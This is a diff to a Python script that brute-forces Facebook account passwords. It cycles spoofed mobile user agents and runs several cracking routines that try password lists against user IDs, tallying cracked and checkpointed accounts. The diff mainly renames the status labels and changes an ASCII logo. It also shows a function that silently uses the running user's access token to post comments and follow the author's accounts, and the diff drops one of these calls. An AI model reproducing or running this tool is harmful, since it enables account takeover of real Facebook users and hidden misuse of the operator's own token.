@@ -40,13 +40,8 @@ ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (
 ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])
 
 # Logo
-___logo___ = ("""
-\x1b[95;3m   ____        __       _
-   \x1b[95;3m/ __ \__  __/ /______(_)
-  \x1b[95;3m/ /_/ / / / / __/ ___/ /
- \x1b[95;3m/ ____/ /_/ / /_/ /  / /
-\x1b[95;3m/_/    \__,_/\__/_/  /_/
-""")
+___logo___ = ("""%s ____\n|  _ \ _   _ _ __ ___  _ __\n%s| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n%s|____/ \__,_|_| |_| |_| .__/\n                      |_|
+"""%(H,H,P,P))
 
 # Penampung
 loop = 0
@@ -147,7 +142,6 @@ def ___follow___():
         requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___komen3___,___token___)) #foto sampul
         requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___komen___,___token___)) #foto profil
         requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #foto profil
-        requests.post('https://graph.facebook.com/914950576126047/comments/?message=%s&access_token=%s'%(___komen2___,___token___)) #Kang Recode
         requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
 	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Muhammad Abill
     except:
@@ -835,7 +829,7 @@ def ___metode___():
 def mbasic(ids, uid, pwx, **kwargs):
     global loop, ua, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
@@ -872,7 +866,7 @@ def mbasic(ids, uid, pwx, **kwargs):
 def free(ids, uid, pwx, **kwargs):
     global loop, ua, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
@@ -909,7 +903,7 @@ def free(ids, uid, pwx, **kwargs):
 def mobile(ids, uid, pwx, **kwargs):
     global loop, ua, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
@@ -946,7 +940,7 @@ def mobile(ids, uid, pwx, **kwargs):
 def crack(ids, uid, pwx, **kwargs):
     global loop, ua, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
@@ -983,7 +977,7 @@ def crack(ids, uid, pwx, **kwargs):
 def api(ids, uid, pwx):
     global loop, ua, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
@@ -1009,7 +1003,7 @@ def api(ids, uid, pwx):
 def crack2(ids, uid, pwx, **kwargs):
     global loop, uas, ok, cp
     sys.stdout.write(
-        "\r\x1b[1;97m[Krek] %s/%s Lives:-%s - Die:-%s "%(loop, len(ids), len(ok), len(cp))
+        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
     ); sys.stdout.flush()
     try:
         for pw in pwx:
